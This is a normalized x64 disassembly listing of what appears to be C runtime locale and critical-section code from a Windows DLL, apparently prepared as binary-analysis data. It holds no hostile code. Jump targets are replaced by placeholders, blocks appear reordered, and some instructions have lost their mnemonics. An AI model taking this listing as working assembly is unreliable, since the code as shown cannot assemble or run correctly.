call sub_18002094c
mov rcx [ rbx + 0xc8 ]
call sub_18002094c
mov rcx [ rbx + 0xd0 ]
call sub_18002094c
mov rcx [ rbx + 0xd8 ]
call sub_18002094c
mov rcx [ rbx + 0xe0 ]
call sub_18002094c
mov rcx [ rbx + 0xe8 ]
call sub_18002094c
mov rcx [ rbx + 0xf0 ]
call sub_18002094c
mov rcx [ rbx + 0xf8 ]
call sub_18002094c
mov rcx [ rbx + 0x100 ]
call sub_18002094c
mov rcx [ rbx + 0x108 ]
call sub_18002094c
mov rcx [ rbx + 0x110 ]
call sub_18002094c
mov rcx [ rbx + 0x118 ]
call sub_18002094c
mov rcx [ rbx + 0x120 ]
call sub_18002094c
mov rcx [ rbx + 0x128 ]
call sub_18002094c
mov rcx [ rbx + 0x130 ]
call sub_18002094c
mov rcx [ rbx + 0x138 ]
call sub_18002094c
mov rcx [ rbx + 0x140 ]
call sub_18002094c
mov rcx [ rbx + 0x148 ]
call sub_18002094c
mov rcx [ rbx + 0x150 ]
call sub_18002094c
mov rcx [ rbx + 0x170 ]
call sub_18002094c
mov rcx [ rbx + 0x178 ]
call sub_18002094c
mov rcx [ rbx + 0x180 ]
call sub_18002094c
mov rcx [ rbx + 0x188 ]
call sub_18002094c
mov rcx [ rbx + 0x190 ]
call sub_18002094c
mov rcx [ rbx + 0x198 ]
call sub_18002094c
mov rcx [ rbx + 0x168 ]
call sub_18002094c
mov rcx [ rbx + 0x1a8 ]
call sub_18002094c
mov rcx [ rbx + 0x1b0 ]
call sub_18002094c
mov rcx [ rbx + 0x1b8 ]
call sub_18002094c
mov rcx [ rbx + 0x1c0 ]
call sub_18002094c
mov rcx [ rbx + 0x1c8 ]
call sub_18002094c
mov rcx [ rbx + 0x1d0 ]
call sub_18002094c
mov rcx [ rbx + 0x1a0 ]
call sub_18002094c
mov rcx [ rbx + 0x1d8 ]
call sub_18002094c
mov rcx [ rbx + 0x1e0 ]
call sub_18002094c
mov rcx [ rbx + 0x1e8 ]
call sub_18002094c
mov rcx [ rbx + 0x1f0 ]
call sub_18002094c
mov rcx [ rbx + 0x1f8 ]
call sub_18002094c
mov rcx [ rbx + 0x200 ]
call sub_18002094c
mov rcx [ rbx + 0x208 ]
call sub_18002094c
mov rcx [ rbx + 0x210 ]
call sub_18002094c
mov rcx [ rbx + 0x218 ]
call sub_18002094c
mov rcx [ rbx + 0x220 ]
call sub_18002094c
mov rcx [ rbx + 0x228 ]
call sub_18002094c
mov rcx [ rbx + 0x230 ]
call sub_18002094c
mov rcx [ rbx + 0x238 ]
call sub_18002094c
mov rcx [ rbx + 0x240 ]
call sub_18002094c
mov rcx [ rbx + 0x248 ]
call sub_18002094c
mov rcx [ rbx + 0x250 ]
call sub_18002094c
mov rcx [ rbx + 0x258 ]
call sub_18002094c
mov rcx [ rbx + 0x260 ]
call sub_18002094c
mov rcx [ rbx + 0x268 ]
call sub_18002094c
mov rcx [ rbx + 0x270 ]
call sub_18002094c
mov rcx [ rbx + 0x278 ]
call sub_18002094c
mov rcx [ rbx + 0x280 ]
call sub_18002094c
mov rcx [ rbx + 0x288 ]
call sub_18002094c
mov rcx [ rbx + 0x290 ]
call sub_18002094c
mov rcx [ rbx + 0x298 ]
call sub_18002094c
mov rcx [ rbx + 0x2a0 ]
call sub_18002094c
mov rcx [ rbx + 0x2a8 ]
call sub_18002094c
mov rcx [ rbx + 0x2b0 ]
call sub_18002094c
mov rcx [ rbx + 0x2b8 ]
call sub_18002094c
add rsp 0x20
pop rbx
sub_18002c56c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x20
cmp [ rcx + 0x20 ] 0x0
mov rdi rcx
lea rbp [ rw-data ]
je r-xdata
mov rbx rbp
mov edx 0x2c0
mov ecx 0x1
call sub_180022c90
mov rbx rax
test rax rax
jne r-xdata
mov [ rdi + 0x158 ] rbx
xor eax eax
[ rax + 0x160 ]
mov rdx rdi
mov rcx rax
call sub_18002b60c
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov [ rbx + 0x160 ] 0x1
jmp r-xdata
mov rcx rbx
call sub_18002c17c
mov rcx rbx
call sub_18002094c
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rdi + 0x158 ]
cmp rax rbp
je r-xdata
sub_18002c608
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x8 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x10 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x58 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x60 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18002094c
add rsp 0x20
pop rbx
call sub_18002094c
sub_18002c674
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
xor ebx ebx
mov rsi rcx
mov [ rax - 0x38 ] rcx
mov [ rax - 0x30 ] rbx
cmp [ rcx + 0x1c ] ebx
jne r-xdata
mov edi 0x98
mov r12d 0x1
mov edx edi
mov ecx r12d
call sub_180022c90
mov rbp rax
test rax rax
jne r-xdata
cmp [ rcx + 0x18 ] ebx
jne r-xdata
mov rdx [ rsi + 0x128 ]
mov rcx rax
mov r8 rdi
call sub_1800205e0
mov edi 0x4
mov ecx edi
call sub_180022c10
mov r14 rax
test rax rax
jne r-xdata
mov eax r12d
jmp r-xdata
mov r13d ebx
mov r14d ebx
lea rbp [ rw-data ]
jmp r-xdata
mov [ rax ] ebx
cmp [ rsi + 0x1c ] ebx
je r-xdata
mov rcx rbp
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rax [ rsi + 0x118 ]
test rax rax
je r-xdata
mov rax [ rw-data ]
mov r13 rbx
mov [ rbp ] rax
mov rax [ rw-data ]
mov [ rbp + 0x8 ] rax
mov rax [ rw-data ]
mov [ rbp + 0x10 ] rax
mov rax [ rw-data ]
mov [ rbp + 0x58 ] rax
mov rax [ rw-data ]
mov [ rbp + 0x60 ] rax
mov rcx rdi
call sub_180022c10
mov r13 rax
test rax rax
je r-xdata
mov rcx [ rsi + 0x110 ]
test rcx rcx
je r-xdata
[ rax ]
mov [ r13 ] r12d
mov rcx rbp
call sub_18002094c
mov rcx r14
jmp r-xdata
mov [ rax ] ebx
movzx edi [ rsi + 0x3e ]
lea rcx [ rsp + 0x30 ]
mov r9d 0xe
mov edx r12d
mov r8d edi
mov [ rsp + 0x20 ] rbp
call sub_180025790
lea rcx [ rbp + 0x8 ]
mov [ rsp + 0x20 ] rcx
lea rcx [ rsp + 0x30 ]
mov r9d 0xf
mov r8d edi
mov edx r12d
mov ebx eax
call sub_180025790
lea r15 [ rbp + 0x10 ]
lea rcx [ rsp + 0x30 ]
mov r9d 0x10
mov r8d edi
mov edx r12d
or ebx eax
mov [ rsp + 0x20 ] r15
call sub_180025790
mov r9d 0xe
or ebx eax
lea rax [ rbp + 0x58 ]
lea rcx [ rsp + 0x30 ]
lea edx [ r9 - 0xc ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180025790
mov r9d 0xf
or ebx eax
lea rax [ rbp + 0x60 ]
lea rcx [ rsp + 0x30 ]
lea edx [ r9 - 0xd ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180025790
or eax ebx
je r-xdata
mov [ rsi + 0x118 ] r13
mov [ rsi + 0x110 ] r14
mov [ rsi + 0x128 ] rbp
xor eax eax
[ rcx ]
jne r-xdata
call sub_18002094c
jmp r-xdata
mov rdx [ r15 ]
xor ebx ebx
jmp r-xdata
mov rcx rbp
call sub_18002c608
or r12d 0xffffffff
mov rcx [ rsi + 0x110 ]
call sub_18002094c
mov rcx [ rsi + 0x128 ]
call sub_18002094c
cmp [ rdx ] bl
jne r-xdata
mov al [ rdx ]
cmp al 0x30
jl r-xdata
jmp r-xdata
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
mov [ r14 ] r12d
test r13 r13
je r-xdata
add rdx r12
mov r8 rdx
sub al 0x30
mov [ rdx ] al
mov al [ r8 + 0x1 ]
mov [ r8 ] al
inc r8
test al al
jne r-xdata
jmp r-xdata
sub_18002c8dc
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x18 ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x20 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x28 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x30 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x38 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x40 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x48 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x68 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x70 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x78 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x80 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x88 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x90 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18002094c
add rsp 0x20
pop rbx
call sub_18002094c
sub_18002c9e8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x40
xor ebx ebx
mov rsi rcx
mov [ rbp - 0x10 ] rcx
mov r13d ebx
mov [ rbp - 0x8 ] rbx
cmp [ rcx + 0x18 ] ebx
jne r-xdata
mov r15d 0x98
mov ecx 0x1
mov edx r15d
call sub_180022c90
mov r12 rax
test rax rax
jne r-xdata
cmp [ rcx + 0x1c ] ebx
jne r-xdata
mov edi 0x4
mov ecx edi
call sub_180022c10
mov r14 rax
test rax rax
jne r-xdata
mov eax 0x1
jmp r-xdata
mov r14d ebx
lea r12 [ rw-data ]
jmp r-xdata
mov [ rax ] ebx
cmp [ rsi + 0x18 ] ebx
je r-xdata
mov rcx r12
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rdi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rax [ rsi + 0x120 ]
test rax rax
je r-xdata
lea rdx [ rw-data ]
mov rcx r12
mov r8 r15
call sub_1800205e0
mov rcx rdi
call sub_180022c10
mov r13 rax
test rax rax
jne r-xdata
mov rcx [ rsi + 0x110 ]
test rcx rcx
je r-xdata
[ rax ]
mov [ r13 ] 0x1
mov [ rax ] ebx
movzx edi [ rsi + 0x38 ]
mov r9d 0x15
lea rax [ r12 + 0x18 ]
lea rcx [ rbp - 0x10 ]
lea edx [ r9 - 0x14 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180025790
lea rcx [ r12 + 0x20 ]
mov r9d 0x14
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0x13 ]
lea rcx [ rbp - 0x10 ]
mov r8d edi
mov ebx eax
call sub_180025790
lea rcx [ r12 + 0x28 ]
mov r9d 0x16
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0x15 ]
lea rcx [ rbp - 0x10 ]
mov r8d edi
or ebx eax
call sub_180025790
mov r9d 0x17
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x30 ]
lea edx [ r9 - 0x16 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180025790
mov r9d 0x18
lea r15 [ r12 + 0x38 ]
lea rcx [ rbp - 0x10 ]
lea edx [ r9 - 0x17 ]
mov r8d edi
or ebx eax
mov [ rsp + 0x20 ] r15
call sub_180025790
mov r9d 0x50
or ebx eax
lea rax [ r12 + 0x40 ]
lea rcx [ rbp - 0x10 ]
lea edx [ r9 - 0x4f ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180025790
mov r9d 0x51
or ebx eax
lea rax [ r12 + 0x48 ]
lea rcx [ rbp - 0x10 ]
lea edx [ r9 - 0x50 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180025790
lea rcx [ rbp - 0x10 ]
mov r9d 0x1a
or ebx eax
lea rax [ r12 + 0x50 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180025790
lea rcx [ rbp - 0x10 ]
mov r9d 0x19
or ebx eax
lea rax [ r12 + 0x51 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180025790
lea rcx [ rbp - 0x10 ]
mov r9d 0x54
or ebx eax
lea rax [ r12 + 0x52 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180025790
or ebx eax
lea rax [ r12 + 0x53 ]
lea rcx [ rbp - 0x10 ]
mov r9d 0x55
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180025790
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x54 ]
mov r9d 0x56
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180025790
lea rcx [ rbp - 0x10 ]
mov r9d 0x57
or ebx eax
lea rax [ r12 + 0x55 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180025790
lea rcx [ rbp - 0x10 ]
mov r9d 0x52
or ebx eax
lea rax [ r12 + 0x56 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180025790
lea rcx [ rbp - 0x10 ]
mov r9d 0x53
or ebx eax
lea rax [ r12 + 0x57 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180025790
mov r9d 0x15
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x68 ]
lea edx [ r9 - 0x13 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180025790
mov r9d 0x14
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x70 ]
lea edx [ r9 - 0x12 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180025790
mov r9d 0x16
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x78 ]
lea edx [ r9 - 0x14 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180025790
mov r9d 0x17
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x80 ]
lea edx [ r9 - 0x15 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180025790
mov r9d 0x50
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x88 ]
lea edx [ r9 - 0x4e ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180025790
or ebx eax
mov r9d 0x51
lea rax [ r12 + 0x90 ]
lea rcx [ rbp - 0x10 ]
lea edx [ r9 - 0x4f ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180025790
or eax ebx
je r-xdata
mov rcx r12
call sub_18002094c
mov rcx r14
jmp r-xdata
mov [ rsi + 0x120 ] r13
mov [ rsi + 0x110 ] r14
mov [ rsi + 0x128 ] r12
xor eax eax
[ rcx ]
jne r-xdata
mov rdx [ r15 ]
xor ebx ebx
jmp r-xdata
mov rcx r12
call sub_18002c8dc
mov rcx r12
call sub_18002094c
mov rcx r14
call sub_18002094c
mov rcx r13
jmp r-xdata
call sub_18002094c
jmp r-xdata
mov rcx [ rsi + 0x128 ]
call sub_18002094c
mov rcx [ rsi + 0x110 ]
call sub_18002094c
cmp [ rdx ] bl
jne r-xdata
mov al [ rdx ]
cmp al 0x30
jl r-xdata
jmp r-xdata
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
mov rax [ rsi + 0x128 ]
mov rcx [ rax ]
mov [ r12 ] rcx
mov rax [ rsi + 0x128 ]
mov rcx [ rax + 0x8 ]
mov [ r12 + 0x8 ] rcx
mov rax [ rsi + 0x128 ]
mov rcx [ rax + 0x10 ]
mov [ r12 + 0x10 ] rcx
mov rax [ rsi + 0x128 ]
mov rcx [ rax + 0x58 ]
mov [ r12 + 0x58 ] rcx
mov rax [ rsi + 0x128 ]
mov rcx [ rax + 0x60 ]
mov [ r12 + 0x60 ] rcx
mov [ r14 ] 0x1
test r13 r13
je r-xdata
inc rdx
mov r8 rdx
sub al 0x30
mov [ rdx ] al
mov al [ r8 + 0x1 ]
mov [ r8 ] al
inc r8
test al al
jne r-xdata
jmp r-xdata
sub_18002ce9c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x20
lea r12 [ rw-data ]
xor esi esi
xor ebx ebx
mov rdi r12
inc ebx
add rdi 0x10
cmp ebx 0x24
jl r-xdata
movsxd rax esi
mov edx 0xfa0
inc esi
lea rcx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rcx [ rax + rcx * 8 ]
mov [ rdi ] rcx
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ rdi + 0x8 ] 0x1
jne r-xdata
mov eax 0x1
movsxd rax ebx
add rax rax
and [ r12 + rax * 8 ] 0x0
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
sub_18002cf20
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov edi 0x24
lea rbx [ rw-data ]
mov esi edi
add rbx 0x10
dec rsi
jne r-xdata
cmp [ rbx + 0x8 ] 0x1
je r-xdata
mov rbp [ rbx ]
test rbp rbp
je r-xdata
lea rbx [ rw-data ]
mov rcx rbp
call [ DeleteCriticalSection@IAT ]
mov rcx rbp
call sub_18002094c
and [ rbx ] 0x0
add rbx 0x10
dec rdi
jne r-xdata
cmp [ rbx ] 0x1
jne r-xdata
mov rcx [ rbx - 0x8 ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
call [ DeleteCriticalSection@IAT ]
sub_18002cfc0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r13
sub rsp 0x20
movsxd rbx ecx
mov esi 0x1
cmp [ rw-data ] 0x0
jne r-xdata
mov rdi rbx
add rdi rdi
lea r13 [ rw-data ]
cmp [ r13 + rdi * 8 ] 0x0
je r-xdata
call sub_18002574c
lea ecx [ rsi + 0x1d ]
call sub_1800254ec
mov ecx 0xff
call sub_180026590
mov ecx 0x28
call sub_180022c10
mov rbx rax
test rax rax
jne r-xdata
mov eax esi
jmp r-xdata
mov ecx 0xa
call sub_18002d0a8
nop
mov rcx rbx
cmp [ r13 + rdi * 8 ] 0x0
jne r-xdata
call sub_180022de4
mov [ rax ] 0xc
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r13
retn
call sub_18002094c
nop
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ r13 + rdi * 8 ] rbx
jmp r-xdata
mov rcx rbx
call sub_18002094c
call sub_180022de4
mov [ rax ] 0xc
xor esi esi
jmp r-xdata
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
sub_18002d0a8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
lea rdi [ rw-data ]
add rbx rbx
cmp [ rdi + rbx * 8 ] 0x0
jne r-xdata
mov rcx [ rdi + rbx * 8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp [ EnterCriticalSection@IAT ]
call sub_18002cfc0
test eax eax
jne r-xdata
lea ecx [ rax + 0x11 ]
call sub_1800268d0
sub_18002d0ec
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_180022de4
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
cmp [ rcx ] r10b
je r-xdata
mov [ rcx ] r10b
test rdx rdx
jne r-xdata
inc rcx
dec rdx
jne r-xdata
sub rcx r8
mov [ r9 ] r10b
jmp r-xdata
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10b
call sub_180022de4
mov ebx 0x22
jmp r-xdata
mov al [ r8 ]
mov [ rcx + r8 ] al
inc r8
test al al
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_180026534
mov eax ebx
sub_18002d168
push rbx
sub rsp 0x20
xor ebx ebx
mov r10 r8
test r9 r9
jne r-xdata
test rcx rcx
je r-xdata
test rcx rcx
jne r-xdata
call sub_180022de4
mov ebx 0x16
test rdx rdx
je r-xdata
test rdx rdx
jne r-xdata
test r9 r9
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
jne r-xdata
mov [ rcx ] bl
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov r11 rcx
mov r8 rdx
cmp r9 0xffffffffffffffff
jne r-xdata
mov [ rcx ] bl
sub r10 rcx
sub r11 r10
test r9 r9
jne r-xdata
dec r8
je r-xdata
test r8 r8
jne r-xdata
dec r8
jne r-xdata
mov [ r11 ] bl
dec r9
jne r-xdata
cmp r9 0xffffffffffffffff
jne r-xdata
mov al [ r10 ]
mov [ r11 + r10 ] al
inc r10
test al al
je r-xdata
jmp r-xdata
mov al [ r10 + r11 ]
mov [ r11 ] al
inc r11
test al al
je r-xdata
mov [ rcx ] bl
call sub_180022de4
mov ebx 0x22
jmp r-xdata
mov [ rcx + rdx - 0x1 ] bl
lea eax [ r8 + 0x50 ]
jmp r-xdata
mov [ rax ] ebx
call sub_180026534
mov eax ebx
sub_18002d228
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
xor ebx ebx
mov r13 r8
mov edi edx
mov r14 rcx
mov eax 0x1
mov esi ebx
test edx edx
js r-xdata
test eax eax
test eax eax
je r-xdata
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
sete bl
mov eax ebx
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
mov rcx [ r13 ]
lea eax [ rsi + rdi ]
cdq
sub eax edx
sar eax 0x1
movsxd rbp eax
mov r12 rbp
add r12 r12
mov rdx [ r14 + r12 * 8 ]
call sub_180030c4c
test eax eax
jne r-xdata
jns r-xdata
lea rcx [ r14 + r12 * 8 + 0x8 ]
mov [ r13 ] rcx
jmp r-xdata
lea esi [ rbp + 0x1 ]
lea edi [ rbp - 0x1 ]
jmp r-xdata
cmp esi edi
jle r-xdata
sub_18002d2c0
mov dl [ rcx ]
mov r8 rcx
xor r9d r9d
jmp r-xdata
test dl dl
jne r-xdata
lea eax [ rdx - 0x61 ]
inc r8
cmp al 0x5
ja r-xdata
mov eax r9d
retn
lea eax [ rdx - 0x41 ]
cmp al 0x5
ja r-xdata
add dl 0xd9
jmp r-xdata
movsx ecx dl
mov dl [ r8 ]
add r9d r9d
lea r9d [ rcx + r9 * 8 - 0x30 ]
add dl 0xf9
sub_18002d2fc
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov rbx rcx
call sub_180025c90
mov rcx rbx
mov rdi rax
call sub_18002d2c0
mov ecx [ rdi + 0x15c ]
neg ecx
lea r8 [ rsp + 0x20 ]
mov r9d 0x78
sbb edx edx
mov ecx eax
mov esi eax
and edx 0xfffff005
add edx 0x1002
call [ GetLocaleInfoA@IAT ]
xor ebx ebx
test eax eax
jne r-xdata
mov rcx [ rdi + 0x148 ]
lea rdx [ rsp + 0x20 ]
call sub_180030c4c
test eax eax
jne r-xdata
mov [ rdi + 0x150 ] ebx
lea eax [ rbx + 0x1 ]
jmp r-xdata
mov eax [ rdi + 0x150 ]
shr eax 0x2
not eax
and eax 0x1
lea rax [ r--data ]
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0xb0 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
inc ebx
add rax 0x2
cmp ebx 0xa
jb r-xdata
cmp si [ rax ]
je r-xdata
or [ rdi + 0x150 ] 0x4
mov [ rdi + 0x164 ] esi
mov [ rdi + 0x160 ] esi
sub_18002d3e4
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
sub rsp 0x20
mov edi ecx
mov rbp r8
and ecx 0x3ff
mov esi edx
lea r8 [ rax + 0x8 ]
mov r9d 0x2
bts ecx 0xa
mov edx 0x20000001
call [ GetLocaleInfoW@IAT ]
xor ebx ebx
test eax eax
jne r-xdata
cmp edi [ rsp + 0x30 ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
test esi esi
je r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbp ]
sub al 0x61
cmp al 0x19
ja r-xdata
cmp al 0x5a
jle r-xdata
mov rcx [ rbp ]
call sub_180023ce0
cmp ebx eax
je r-xdata
inc ebx
jmp r-xdata
mov al [ rcx ]
inc rcx
cmp al 0x41
jl r-xdata
sub_18002d474
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rdi
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xb0 ] rax
mov rbx rcx
call sub_180025c90
mov rcx rbx
mov rdi rax
call sub_18002d2c0
mov ecx [ rdi + 0x15c ]
neg ecx
lea r8 [ rsp + 0x30 ]
mov r9d 0x78
sbb edx edx
mov ecx eax
mov ebx eax
and edx 0xfffff005
add edx 0x1002
call [ GetLocaleInfoA@IAT ]
xor ebp ebp
test eax eax
jne r-xdata
mov rcx [ rdi + 0x148 ]
lea rdx [ rsp + 0x30 ]
call sub_180030c4c
test eax eax
jne r-xdata
mov [ rdi + 0x150 ] ebp
mov eax 0x1
jmp r-xdata
mov eax [ rdi + 0x150 ]
mov ecx 0x300
and eax ecx
cmp eax ecx
je r-xdata
mov eax [ rdi + 0x158 ]
lea r8 [ rsp + 0x30 ]
mov r9d 0x78
neg eax
mov ecx ebx
sbb edx edx
and edx 0xfffff002
add edx 0x1001
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
mov rcx [ rsp + 0xb0 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0xc0 ]
mov rbx [ r11 + 0x18 ]
mov rbp [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
mov eax [ rdi + 0x150 ]
shr eax 0x2
not eax
and eax 0x1
mov eax [ rdi + 0x158 ]
lea r8 [ rsp + 0x30 ]
mov r9d 0x78
neg eax
mov ecx ebx
sbb edx edx
and edx 0xfffff002
add edx 0x1001
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_180030c4c
test eax eax
jne r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_180030c4c
test eax eax
jne r-xdata
test [ rdi + 0x150 ] 0x2
jne r-xdata
or [ rdi + 0x150 ] 0x304
mov [ rdi + 0x160 ] ebx
jmp r-xdata
cmp [ rdi + 0x158 ] ebp
jne r-xdata
bts [ rdi + 0x150 ] 0x9
mov eax [ rdi + 0x150 ]
cmp [ rdi + 0x158 ] ebp
je r-xdata
cmp [ rdi + 0x154 ] ebp
je r-xdata
mov [ rdi + 0x164 ] ebx
cmp [ rdi + 0x154 ] ebp
je r-xdata
cmp [ rdi + 0x154 ] ebp
je r-xdata
bts eax 0x8
mov [ rdi + 0x150 ] eax
jmp r-xdata
mov eax [ rdi + 0x150 ]
test al 0x1
jne r-xdata
movsxd r8 [ rdi + 0x154 ]
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_180030dec
test eax eax
jne r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_180030c4c
test eax eax
jne r-xdata
bts [ rdi + 0x150 ] 0x8
mov rcx [ rdi + 0x140 ]
call sub_180023ce0
cmp eax [ rdi + 0x154 ]
jne r-xdata
cmp [ rdi + 0x160 ] ebp
